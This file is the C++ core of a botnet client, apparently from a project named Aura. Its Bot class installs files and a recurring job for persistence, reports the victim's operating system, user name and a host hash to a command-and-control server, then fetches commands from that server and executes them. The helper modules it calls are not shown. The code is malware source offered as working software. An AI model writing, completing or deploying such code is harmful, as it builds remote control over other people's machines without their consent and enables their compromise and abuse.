#include <memory>
#include <string>

#include "command.hh"
#include "request.hh"
#include "seed.hh"
#include "system.hh"

const std::string HASH_TYPE("SHA256");

class Bot {
   public:
    Bot(const std::string& seed_path) {
        hash_type_ = HASH_TYPE;
        seed_ = std::make_unique<Seed>(seed_path);
    }

    void Init();
    bool IsInit();
    void RegisterBot(const std::string& register_url);
    void ExecuteCommand(const std::string& command_url);

   private:
    std::string hash_type_, hash_sum_, os_, user_;
    std::unique_ptr<Seed> seed_;

    void PrepareSysInfo_();
};

void Bot::Init() {
    // Install files and components
    install::InstallFiles();
    seed_->InitSeed();
    install::InitRecurringJob();
}

bool Bot::IsInit() { return seed_->Exists(); }

void Bot::RegisterBot(const std::string& register_url) {
    // Register bot with C2 server
    PrepareSysInfo_();
    request::PostForm post_form;
    post_form.AddField("version", AURA_VERSION);
    post_form.AddField("hash_type", hash_type_);
    post_form.AddField("hash_sum", hash_sum_);
    post_form.AddField("operating_sys", os_);
    post_form.AddField("user", user_);
    request::Post(register_url, post_form.ToString());
}

void Bot::ExecuteCommand(const std::string& command_url) {
    // Update system info and create POST form
    PrepareSysInfo_();
    request::PostForm post_form;
    post_form.AddField("version", AURA_VERSION);
    post_form.AddField("hash_sum", hash_sum_);

    std::string response = request::Post(command_url, post_form.ToString());

    // Parse response from C2 server and execute based on JSON data
    Command cmd(response);
    cmd.Execute();
}

void Bot::PrepareSysInfo_() {
    // Init or retrieve seed
    if (seed_->Exists()) {
        seed_->GetSeed();
    } else {
        seed_->InitSeed();
    }

    // Retrieve values if they haven't been already
    if (!(hash_sum_.size())) {
        hash_sum_ = seed_->GetHash();
    }
    if (!(os_.size())) {
        os_ = util::GetOS();
    }
    if (!(user_.size())) {
        user_ = util::GetUser();
    }
}